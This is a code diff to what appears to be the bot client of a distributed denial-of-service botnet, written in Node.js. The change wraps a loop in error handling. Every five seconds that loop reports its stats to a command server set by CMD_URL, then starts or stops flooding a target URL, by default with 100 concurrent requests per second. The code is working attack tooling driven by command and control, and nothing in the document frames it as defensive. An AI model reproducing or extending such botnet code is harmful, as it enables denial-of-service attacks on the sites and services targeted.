@@ -21,24 +21,28 @@ app.get('/', (req, res) => {
 });
 
 const sendUpdate = () => {
-    if(!stats.isRun) {
-        stats.reset();
-    }
+    try {
+        if(!stats.isRun) {
+            stats.reset();
+        }
 
-    const url = `${process.env.CMD_URL}api/control/register`;
-    superagent.post(url).send({ botUrl: process.env.URL, loop: stats.loop, success: stats.success, error: stats.error }).end((err, res) => {
-        if(err) {
-            console.error(err);
-            return;
-        }
-        if(stats.isRun && !res.body.target) {
-            attacker.stop();
-            console.log(`Attack stopped`);
-        } else if(!stats.isRun && res.body.target) {
-            attacker.run(res.body.target.url, res.body.target.concurrency || 100, res.body.target.interval || 1000);
-            console.log(`Attack started for ${res.body.target.url}`);
-        }
-    });
+        const url = `${process.env.CMD_URL}api/control/register`;
+        superagent.post(url).send({ botUrl: process.env.URL, loop: stats.loop, success: stats.success, error: stats.error }).end((err, res) => {
+            if(err) {
+                console.error(err);
+                return;
+            }
+            if(stats.isRun && !res.body.target) {
+                attacker.stop();
+                console.log(`Attack stopped`);
+            } else if(!stats.isRun && res.body.target) {
+                attacker.run(res.body.target.url, res.body.target.concurrency || 100, res.body.target.interval || 1000);
+                console.log(`Attack started for ${res.body.target.url}`);
+            }
+        });
+    } catch(err) {
+        console.error(err);
+    }
 };
 
 setInterval(sendUpdate, 5000);
